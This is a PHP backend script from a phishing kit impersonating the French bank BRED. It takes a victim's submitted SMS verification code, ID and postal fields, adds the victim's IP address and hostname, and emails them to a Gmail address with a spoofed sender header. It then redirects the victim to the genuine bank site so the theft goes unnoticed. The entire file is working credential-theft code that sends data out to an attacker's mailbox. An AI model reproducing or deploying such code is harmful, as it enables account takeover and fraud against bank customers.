<?php
session_start();
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "------------+| By_X_X_Prince  |+------------\n";
$bilsmg .= "SMS                       :  ".$_POST['pr']."\n";
$bilsmg .= "------------+| By Ilyas   |+------------\n";
$bilsmg .= "From $ip check in http://whoer.net/check?host=$ip   \n";
$bilsub = "POP1|".$_POST['id1']."|".$_POST['postal1']."|Fr0m ".$ip;
$bilhead = "From: l123.4@yahoo.com";
mail("poporangesms@gmail.com",$bilsub,$bilsmg,$bilhead);
header("Location: https://www.bred.fr/index.html");
?>